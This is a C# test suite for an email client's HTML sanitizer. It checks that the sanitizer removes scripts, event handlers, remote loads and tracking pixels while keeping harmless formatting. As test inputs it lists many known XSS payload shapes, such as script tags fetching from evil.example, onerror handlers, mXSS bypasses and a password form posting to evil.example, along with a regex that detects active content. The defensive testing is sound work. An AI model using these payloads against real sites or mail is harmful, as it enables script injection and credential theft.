using System.Text.RegularExpressions;
using Vinette.Core.Mail;

namespace Vinette.Mail.Tests;

/// <summary>The rules of the HTML sanitizer: what stays, what goes, how the links and pictures are treated.</summary>
public partial class MessageHtmlSanitizerTests
{
    private static readonly MessageHtmlSanitizer Sanitizer = new();

    private static CancellationToken Token => TestContext.Current.CancellationToken;

    private static string Clean(string html) => Sanitizer.Sanitize(html).Html;

    private static async Task<SanitizedHtml> SanitizeFixtureAsync(string file)
    {
        await using var stream = File.OpenRead(Path.Combine(AppContext.BaseDirectory, "fixtures", file));
        var parsed = await new MimeMessageParser().ParseAsync(stream, Token);
        return Sanitizer.Sanitize(parsed.Html);
    }

    /// <summary>Whatever in the output could run or load something. The check is on the text, so it does not trust the parser.</summary>
    [GeneratedRegex(@"<\s*(script|iframe|object|embed|form|input|button|select|textarea|svg|math|meta|base|link|frame|applet|template|noscript)\b|\bon[a-z]+\s*=|javascript\s*:|vbscript\s*:|expression\s*\(|@import|url\s*\(|srcdoc|<!--|-moz-binding|behavior\s*:", RegexOptions.IgnoreCase | RegexOptions.CultureInvariant)]
    private static partial Regex Active();

    private static void AssertInert(string output) =>
        Assert.False(Active().IsMatch(output), $"Active content is left in: {output}");

    [Fact]
    public async Task The_Malicious_Fixture_Comes_Out_Without_Anything_Active_And_Keeps_What_Is_Harmless()
    {
        var result = await SanitizeFixtureAsync("10-malicious-html.eml");

        AssertInert(result.Html);
        Assert.Contains("safe-marker", result.Html, StringComparison.Ordinal);
        Assert.Contains("href=\"http://example.org/ok\"", result.Html, StringComparison.Ordinal);
        Assert.Contains("safe link", result.Html, StringComparison.Ordinal);
        Assert.Contains("styled", result.Html, StringComparison.Ordinal);
        Assert.False(result.Rejected);
    }

    [Fact]
    public async Task The_External_Resources_Fixture_Loads_Nothing_From_The_Internet_And_Counts_What_Was_Taken_Out()
    {
        var result = await SanitizeFixtureAsync("12-external-resources.eml");

        AssertInert(result.Html);
        Assert.DoesNotMatch(@"(src|background|srcset|href)\s*=\s*""?(https?:)?//", result.Html);
        Assert.DoesNotContain("http://", result.Html.Replace("http://www.w3.org", string.Empty, StringComparison.Ordinal), StringComparison.OrdinalIgnoreCase);
        Assert.True(result.BlockedExternalResources >= 3, $"Counted {result.BlockedExternalResources}");
        Assert.Contains("Newsletter", result.Html, StringComparison.Ordinal);
    }

    [Theory]
    [InlineData("02-utf8-qp-alternative.eml")]
    [InlineData("06-nested-multipart.eml")]
    [InlineData("07-inline-image-cid.eml")]
    [InlineData("13-html-only.eml")]
    public async Task Ordinary_Fixtures_Are_Clean_Without_Being_Counted_As_Tracking(string file)
    {
        var result = await SanitizeFixtureAsync(file);

        AssertInert(result.Html);
        Assert.Equal(0, result.BlockedExternalResources);
        Assert.False(string.IsNullOrWhiteSpace(result.Html));
    }

    private const string Fetched = "data:image/png;base64,iVBORw0KGgo=";

    [Fact]
    public void External_Pictures_Are_Reported_Once_Each_And_Blocked_Without_A_Resolver()
    {
        var result = Sanitizer.Sanitize(
            "<img src=\"https://cdn.example.org/a.png\"><img src=\"https://cdn.example.org/a.png\"><img src=\"//cdn.example.org/b.png\"><img src=\"http://x.example/c.gif\">",
            null,
            IMessageHtmlSanitizer.MaxInputLength);

        Assert.Equal(["https://cdn.example.org/a.png", "https://cdn.example.org/b.png", "http://x.example/c.gif"], result.ExternalImageList);
        Assert.Equal(4, result.BlockedExternalResources);
        Assert.DoesNotContain("example", result.Html, StringComparison.Ordinal);
    }

    [Fact]
    public void A_Picture_The_Application_Fetched_Is_Put_In_As_Data_And_The_Rest_Stays_Out()
    {
        var result = Sanitizer.Sanitize(
            "<img src=\"https://cdn.example.org/a.png\"><img src=\"https://cdn.example.org/missing.png\">",
            null,
            IMessageHtmlSanitizer.MaxInputLength,
            url => url == "https://cdn.example.org/a.png" ? Fetched : null);

        Assert.Contains($"src=\"{Fetched}\"", result.Html, StringComparison.Ordinal);
        Assert.DoesNotContain("example.org", result.Html, StringComparison.Ordinal);
        Assert.Equal(1, result.BlockedExternalResources); // only the one that was not fetched
        Assert.Equal(2, result.ExternalImageList.Count);
    }

    [Fact]
    public void Only_Pictures_Are_Resolved_Not_Other_Loads()
    {
        var asked = new List<string>();

        var result = Sanitizer.Sanitize(
            "<body style=\"background:url('http://t.example/bg.png')\"><table background=\"http://t.example/t.png\"><tr><td>x</td></tr></table><a href=\"http://t.example/page\">go</a><img src=\"https://cdn.example.org/a.png\"></body>",
            null,
            IMessageHtmlSanitizer.MaxInputLength,
            url =>
            {
                asked.Add(url);
                return Fetched;
            });

        Assert.Equal(["https://cdn.example.org/a.png"], asked);
        Assert.Equal(["https://cdn.example.org/a.png"], result.ExternalImageList);
        Assert.DoesNotMatch(@"(background|url)\s*[:=(]\s*[""']?\s*https?:", result.Html);
        Assert.Contains("href=\"http://t.example/page\"", result.Html, StringComparison.Ordinal); // a link is not a load
    }

    [Fact]
    public void A_Resolver_Cannot_Bring_Anything_Active_Into_The_Body()
    {
        // Whatever the resolver returns goes through the same check as any picture address: only data:image is kept.
        var result = Sanitizer.Sanitize(
            "<img src=\"https://cdn.example.org/a.png\">",
            null,
            IMessageHtmlSanitizer.MaxInputLength,
            _ => "javascript:alert(1)");

        AssertInert(result.Html);
        Assert.DoesNotContain("javascript", result.Html, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void No_More_Than_The_Limit_Of_Pictures_Is_Reported()
    {
        var html = string.Concat(Enumerable.Range(0, 50).Select(i => $"<img src=\"https://cdn.example.org/{i}.png\">"));

        var result = Sanitizer.Sanitize(html, null, IMessageHtmlSanitizer.MaxInputLength);

        Assert.Equal(IMessageHtmlSanitizer.MaxExternalImages, result.ExternalImageList.Count);
        Assert.Equal(50, result.BlockedExternalResources); // all are still taken out
    }

    [Fact]
    public async Task Pictures_Of_The_Mail_Itself_Keep_Their_Content_Id()
    {
        var result = await SanitizeFixtureAsync("07-inline-image-cid.eml");

        Assert.Contains("src=\"cid:pixel@example.org\"", result.Html, StringComparison.Ordinal);
    }

    [Theory]
    [InlineData("<script>alert(1)</script>ok")]
    [InlineData("<SCRIPT SRC=http://evil.example/x.js></SCRIPT>ok")]
    [InlineData("<scr<script>ipt>alert(1)</scr</script>ipt>ok")]
    [InlineData("<img src=x onerror=alert(1)>ok")]
    [InlineData("<IMG SRC=\"jav&#x09;ascript:alert(1)\">ok")]
    [InlineData("<IMG SRC=jAvAsCrIpT:alert(1)>ok")]
    [InlineData("<a href=\"  javascript:alert(1)\">ok</a>")]
    [InlineData("<a href=\"&#106;avascript:alert(1)\">ok</a>")]
    [InlineData("<a href=\"java\nscript:alert(1)\">ok</a>")]
    [InlineData("<a href=\"vbscript:msgbox(1)\">ok</a>")]
    [InlineData("<a href=\"data:text/html,<script>alert(1)</script>\">ok</a>")]
    [InlineData("<body onload=alert(1)>ok")]
    [InlineData("<svg><script>alert(1)</script></svg>ok")]
    [InlineData("<svg onload=alert(1)>ok</svg>")]
    [InlineData("<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>ok")]
    [InlineData("<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">ok")]
    [InlineData("<iframe src=\"http://evil.example\"></iframe>ok")]
    [InlineData("<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>ok")]
    [InlineData("<object data=\"x.swf\"></object><embed src=\"x.swf\">ok")]
    [InlineData("<form action=\"http://evil.example\"><input name=p type=password><button>go</button></form>ok")]
    [InlineData("<meta http-equiv=\"refresh\" content=\"0;url=http://evil.example\">ok")]
    [InlineData("<link rel=\"stylesheet\" href=\"http://evil.example/x.css\">ok")]
    [InlineData("<base href=\"http://evil.example/\">ok")]
    [InlineData("<div style=\"width:expression(alert(1))\">ok</div>")]
    [InlineData("<div style=\"background:url(javascript:alert(1))\">ok</div>")]
    [InlineData("<div style=\"-moz-binding:url(http://evil.example/x.xml#x)\">ok</div>")]
    [InlineData("<div style=\"behavior:url(x.htc)\">ok</div>")]
    [InlineData("<!--[if gte mso 9]><script>alert(1)</script><![endif]-->ok")]
    [InlineData("<template><script>alert(1)</script></template>ok")]
    [InlineData("<details open ontoggle=alert(1)>ok</details>")]
    [InlineData("<a href=\"#\" onclick=\"alert(1)\">ok</a>")]
    [InlineData("<p onmouseover=\"alert(1)\" style=\"color:red\">ok</p>")]
    public void Known_Attack_Shapes_Leave_Nothing_Active(string attack)
    {
        var output = Clean(attack);

        AssertInert(output);
        Assert.True(output.Contains("ok", StringComparison.Ordinal) || output.Length == 0, output); // the visible text may stay
    }

    [Fact]
    public void Ordinary_Markup_Keeps_Its_Structure_And_Formatting()
    {
        var output = Clean("<table border=\"1\" width=\"600\" bgcolor=\"#eeeeee\"><tr><td align=\"center\" style=\"color:#333; font-size:14px\"><b>Bold</b> <i>it</i> <u>u</u> <font face=\"Arial\" color=\"red\">red</font></td></tr></table><ul><li>one</li></ul><blockquote>quote</blockquote><h1>Head</h1><hr><br>");

        foreach (var expected in new[] { "<table", "<td", "align=\"center\"", "<b>Bold</b>", "<i>it</i>", "<font", "<ul>", "<li>one</li>", "<blockquote>", "<h1>Head</h1>", "<hr>", "<br>", "font-size: 14px" })
        {
            Assert.Contains(expected, output, StringComparison.Ordinal);
        }
    }

    [Fact]
    public void Style_Blocks_Stay_With_Their_Harmless_Rules_And_Lose_Whatever_Could_Load_Something()
    {
        var result = Sanitizer.Sanitize("<style>@import url(http://evil.example/x.css); p { color: red; background: url(http://evil.example/bg.png) } .a { font-weight: bold } @font-face { font-family: x; src: url(http://evil.example/f.woff) }</style><p class=\"a\">text</p>");

        Assert.Matches(@"color:\s*rgba\(255, 0, 0, 1\)", result.Html);
        Assert.Contains("font-weight", result.Html, StringComparison.Ordinal);
        Assert.DoesNotContain("evil.example", result.Html, StringComparison.Ordinal);
        AssertInert(result.Html);
        Assert.True(result.BlockedExternalResources >= 1);
    }

    [Fact]
    public void Css_Written_With_Escapes_Does_Not_Hide_What_It_Is()
    {
        var output = Clean("<style>p { background: \\75rl(http://evil.example/x.png) }</style><div style=\"background:\\75 rl(http://evil.example/y.png)\">x</div>");

        Assert.DoesNotContain("evil.example", output, StringComparison.Ordinal);
    }

    [Fact]
    public void Positioning_Is_Not_Allowed_So_That_A_Mail_Cannot_Cover_The_Window_With_A_Fake_Page()
    {
        var output = Clean("<div style=\"position:fixed; top:0; left:0; width:100%; height:100%; z-index:9999; color:red\">fake login</div>");

        Assert.DoesNotContain("position", output, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("z-index", output, StringComparison.OrdinalIgnoreCase);
        Assert.Contains("color", output, StringComparison.Ordinal);
    }

    [Fact]
    public void Links_Open_A_New_Page_Without_Giving_It_Access_To_This_One()
    {
        var output = Clean("<a href=\"https://example.org/a\">a</a> <a href=\"mailto:a@example.org\">m</a> <a href=\"tel:+123\">t</a> <a href=\"#top\">h</a>");

        Assert.Equal(4, Regex.Count(output, "target=\"_blank\""));
        Assert.Equal(4, Regex.Count(output, "rel=\"noopener noreferrer\""));
        Assert.Contains("href=\"mailto:a@example.org\"", output, StringComparison.Ordinal);
    }

    [Fact]
    public void A_Link_That_Is_Not_The_Web_Mail_Or_Phone_Loses_Its_Address_But_Keeps_Its_Text()
    {
        var output = Clean("<a href=\"ftp://example.org/x\">ftp</a> <a href=\"/relative/path\">rel</a> <a href=\"//evil.example\">proto</a> <a href=\"file:///etc/passwd\">file</a>");

        Assert.DoesNotContain("href", output, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("target", output, StringComparison.OrdinalIgnoreCase);
        foreach (var text in new[] { "ftp", "rel", "proto", "file" })
        {
            Assert.Contains(text, output, StringComparison.Ordinal);
        }
    }

    [Theory]
    [InlineData("<img src=\"http://tracker.example/p.gif\">")]
    [InlineData("<img src=\"https://tracker.example/p.gif\">")]
    [InlineData("<img src=\"//tracker.example/p.gif\">")]
    [InlineData("<img src=\"http://tracker.example/p.gif\" srcset=\"http://tracker.example/2x.gif 2x\">")]
    [InlineData("<table background=\"http://tracker.example/bg.gif\"><tr><td>x</td></tr></table>")]
    [InlineData("<table><tr><td background=\"https://tracker.example/bg.gif\">x</td></tr></table>")]
    [InlineData("<div style=\"background-image:url('https://tracker.example/bg.png')\">x</div>")]
    public void External_Pictures_Are_Taken_Out_And_Counted(string html)
    {
        var result = Sanitizer.Sanitize(html);

        Assert.DoesNotContain("tracker.example", result.Html, StringComparison.Ordinal);
        Assert.True(result.BlockedExternalResources >= 1, result.Html);
    }

    [Fact]
    public void Small_Embedded_Pictures_Of_The_Safe_Kinds_Stay()
    {
        foreach (var type in new[] { "png", "jpeg", "gif", "webp" })
        {
            var output = Clean($"<img src=\"data:image/{type};base64,iVBORw0KGgo=\" alt=\"a\">");

            Assert.Contains($"data:image/{type};base64,iVBORw0KGgo=", output, StringComparison.Ordinal);
        }
    }

    [Theory]
    [InlineData("data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+")]
    [InlineData("data:image/svg+xml,%3Csvg%20onload=alert(1)%3E")]
    [InlineData("data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==")]
    [InlineData("data:image/png,not-base64")]
    [InlineData("data:application/javascript,alert(1)")]
    public void Embedded_Data_Of_Any_Other_Kind_Is_Removed(string url)
    {
        var output = Clean($"<img src=\"{url}\"><a href=\"{url}\">x</a>");

        Assert.DoesNotContain("data:", output, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void An_Embedded_Picture_Over_The_Size_Limit_Is_Removed()
    {
        var big = Convert.ToBase64String(new byte[IMessageHtmlSanitizer.MaxDataImageBytes + 1024]);

        var output = Clean($"<img src=\"data:image/png;base64,{big}\">");

        Assert.DoesNotContain("data:", output, StringComparison.Ordinal);
    }

    [Fact]
    public void A_Resolver_Turns_A_Content_Id_Into_Whatever_It_Returns_And_Drops_What_It_Cannot_Resolve()
    {
        var asked = new List<string>();
        string? Resolve(string id)
        {
            asked.Add(id);
            return id == "known@x" ? "data:image/png;base64,iVBORw0KGgo=" : null;
        }

        var output = Sanitizer.Sanitize("<img src=\"cid:known@x\" alt=\"a\"><img src=\"cid:unknown@x\" alt=\"b\"><img src=\"https://example.org/p.png\">", Resolve).Html;

        Assert.Equal(["known@x", "unknown@x"], asked); // only cid: addresses reach the resolver
        Assert.Contains("src=\"data:image/png;base64,iVBORw0KGgo=\"", output, StringComparison.Ordinal);
        Assert.DoesNotContain("cid:", output, StringComparison.Ordinal);
        Assert.Equal(1, Regex.Count(output, "src="));
    }

    [Fact]
    public void Without_A_Resolver_Content_Ids_Stay_As_They_Are()
    {
        Assert.Contains("src=\"cid:a@x\"", Sanitizer.Sanitize("<img src=\"cid:a@x\">", null).Html, StringComparison.Ordinal);
    }

    [Fact]
    public void Content_Ids_Are_Kept_And_An_Empty_One_Is_Not()
    {
        Assert.Contains("src=\"cid:logo@example.org\"", Clean("<img src=\"cid:logo@example.org\">"), StringComparison.Ordinal);
        Assert.DoesNotContain("cid:", Clean("<img src=\"cid:\">"), StringComparison.Ordinal);
    }

    [Fact]
    public void Attributes_That_Are_Not_On_The_List_Are_Removed_Even_Harmless_Looking_Ones()
    {
        var output = Clean("<div data-x=\"1\" name=\"n\" contenteditable=\"true\" draggable=\"true\" accesskey=\"x\" tabindex=\"0\" hidden>text</div><a href=\"https://example.org\" ping=\"https://evil.example\" download=\"x\">a</a>");

        foreach (var attribute in new[] { "data-x", "name=", "contenteditable", "draggable", "accesskey", "tabindex", "hidden", "ping", "download" })
        {
            Assert.DoesNotContain(attribute, output, StringComparison.Ordinal);
        }
    }

    [Fact]
    public void Nothing_And_Whitespace_Give_An_Empty_Result()
    {
        Assert.Equal(SanitizedHtml.Empty, Sanitizer.Sanitize(null));
        Assert.Equal(SanitizedHtml.Empty, Sanitizer.Sanitize("   \r\n "));
    }

    [Fact]
    public void Markup_Nested_Far_Deeper_Than_Any_Mail_Is_Refused_And_Cannot_Exhaust_The_Stack()
    {
        var hostile = string.Concat(Enumerable.Repeat("<div>", 100_000)) + "text";

        var result = Sanitizer.Sanitize(hostile);

        Assert.True(result.Rejected);
        Assert.Equal(string.Empty, result.Html);
    }

    [Fact]
    public void Deeply_Nested_Tables_Of_Real_Newsletters_Are_Still_Accepted()
    {
        var nested = string.Concat(Enumerable.Repeat("<table><tr><td>", 40)) + "deep" + string.Concat(Enumerable.Repeat("</td></tr></table>", 40));

        var result = Sanitizer.Sanitize(nested);

        Assert.False(result.Rejected);
        Assert.Contains("deep", result.Html, StringComparison.Ordinal);
    }

    [Fact]
    public void A_Mail_Longer_Than_The_Limit_Is_Cut_And_Says_So()
    {
        var long_ = "<p>" + new string('a', IMessageHtmlSanitizer.MaxInputLength) + "</p><script>alert(1)</script>";

        var result = Sanitizer.Sanitize(long_);

        Assert.True(result.Truncated);
        AssertInert(result.Html);
        Assert.True(result.Html.Length <= IMessageHtmlSanitizer.MaxInputLength + 1000);
    }

    [Fact]
    public void Garbage_Never_Makes_The_Sanitizer_Throw()
    {
        var random = new Random(7);
        var alphabet = "<>/=\"' abcdefghijklmnopqrstuvwxyz!-[]&#;:()\n\\".ToCharArray();
        for (var round = 0; round < 300; round++)
        {
            var text = new string([.. Enumerable.Range(0, random.Next(0, 600)).Select(_ => alphabet[random.Next(alphabet.Length)])]);

            var result = Sanitizer.Sanitize(text);

            AssertInert(result.Html);
        }
    }

    [Fact]
    public void Cleaning_Twice_Changes_Nothing_More()
    {
        var once = Clean("<p style=\"color:red; position:absolute\" onclick=\"x()\">a <a href=\"https://example.org\">b</a> <img src=\"cid:c\"></p><style>p{color:blue}</style>");

        var twice = Clean(once);

        Assert.Equal(once, twice);
    }
}
